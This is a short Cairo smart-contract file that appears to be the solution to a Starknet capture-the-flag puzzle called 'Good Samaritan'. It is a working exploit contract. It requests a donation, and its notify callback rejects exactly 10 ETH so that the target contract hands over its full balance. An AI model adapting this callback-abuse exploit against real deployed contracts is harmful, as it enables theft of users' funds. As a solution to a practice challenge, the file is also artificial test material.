#[starknet::interface]
trait IGoodSamaritanExploit<TContractState> {
    fn drain_samaritan(ref self: TContractState);
    fn notify(self: @TContractState, amount: u256) -> bool;
}

#[starknet::interface]
trait IGoodSamaritan<TContractState> {
    fn isComplete(self: @TContractState) -> bool;
    fn request_donation(self: @TContractState) -> bool;
}


#[starknet::contract]
mod GoodSamaritanExploit {
    use good_samaritan::good_samaritan_exploit::IGoodSamaritanDispatcherTrait;
    use starknet::ContractAddress;
    use super::IGoodSamaritanDispatcher;

    #[storage]
    struct Storage {
        good_samaritan: ContractAddress
    }

    #[constructor]
    fn constructor(ref self: ContractState, _good_samaritan: ContractAddress) {
        self.good_samaritan.write(_good_samaritan);
    }

    #[abi(embed_v0)]
    impl GoodSamaritanExploit of super::IGoodSamaritanExploit<ContractState> {
        fn drain_samaritan(ref self: ContractState) {
            IGoodSamaritanDispatcher { contract_address: self.good_samaritan.read() }
                .request_donation();
        }

        fn notify(self: @ContractState, amount: u256) -> bool {
            let eth_10 = u256 { low: 10000000000000000000_u128, high: 0_u128 }; // 10 eth
            if (amount == eth_10) {
                return false;
            }
            true
        }
    }
}
